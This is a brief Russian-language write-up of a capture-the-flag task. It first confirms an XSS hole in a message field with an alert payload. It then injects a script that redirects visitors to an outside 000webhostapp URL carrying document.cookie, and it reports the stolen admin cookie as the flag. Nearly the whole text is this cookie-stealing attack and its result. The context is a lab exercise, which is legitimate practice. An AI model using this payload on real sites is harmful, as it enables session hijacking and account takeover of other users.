Воодим в поле сообщения скрипт: <script> alert("666") </script> -> появляется окошко со строкой 666 -> есть xss уязвимость.
<script> document.location.href='http://pindohorseqwe.000webhostapp.com/1.php?q='+document.cookie; </script> вводим данный код в тело сообщения -> получаем на сайте -|- .txt куки: ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6, что и является флагом.
